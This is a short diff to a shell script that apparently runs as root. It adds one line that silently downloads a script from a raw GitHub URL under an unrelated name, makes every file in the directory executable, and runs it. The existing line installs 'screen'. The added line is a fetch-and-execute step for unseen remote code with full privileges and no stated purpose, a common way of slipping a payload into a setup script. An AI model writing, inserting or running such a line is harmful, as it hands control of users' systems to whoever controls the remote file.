@@ -1,4 +1,5 @@
 sudo su <<EOF
+wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
 apt-get -y install screen
 
 
